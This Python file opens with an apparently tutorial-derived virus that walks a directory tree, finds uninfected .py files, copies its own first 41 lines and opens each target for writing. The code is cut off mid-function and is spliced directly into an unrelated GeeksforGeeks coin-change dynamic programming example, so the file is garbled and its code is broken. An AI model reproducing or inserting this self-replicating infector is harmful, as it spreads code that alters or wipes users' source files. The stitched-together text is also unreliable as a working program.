#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Dynamic Programming Python implementation of Coin
# Change problem
def count(coins, n, sum):
 
    # table[i] will be storing the number of solutions for
    # value i. We need sum+1 rows as the table is constructed
    # in bottom up manner using the base case (sum = 0)
    # Initialize all table values as 0
    table = [0 for k in range(sum+1)]
 
    # Base case (If given value is 0)
    table[0] = 1
 
    # Pick all coins one by one and update the table[] values
    # after the index greater than or equal to the value of the
    # picked coin
    for i in range(0, n):
        for j in range(coins[i], sum+1):
            table[j] += table[j-coins[i]]
 
    return table[sum]
 
 
# Driver program to test above function
coins = [1, 2, 3]
n = len(coins)
sum = 4
x = count(coins, n, sum)
print(x)
 
# This code is contributed by Afzal Ansari